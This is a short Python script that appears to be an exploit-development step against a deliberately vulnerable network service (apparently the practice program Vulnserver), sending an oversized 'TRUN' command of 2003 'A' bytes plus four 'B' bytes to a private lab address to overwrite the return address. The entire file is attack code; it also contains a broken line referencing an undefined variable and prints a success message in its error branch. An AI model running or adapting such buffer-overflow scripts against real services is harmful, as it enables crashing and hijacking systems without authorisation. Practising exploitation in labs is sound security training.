#!/usr/bin/env python3


import socket, time, sys
from time import sleep

ip = '192.168.74.142'
port = 9999
timeout = 5
evil_buffer = b"A"*2003 + b"B"*4
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    connect = s.connect((ip, port))
    s.recv(1024)
    print("[+] Sending Evil Buffer ...")
    s.send((b'TRUN /.:/' + evil_buffer + b'\r\n'))
    r = s.recv(0)
    s.close()
    buffer = buffer + b"A" * 100
except:
    sleep(5)
    print("[+] Evil Buffer sent!")  
    sys.exit(0)
time.sleep(1)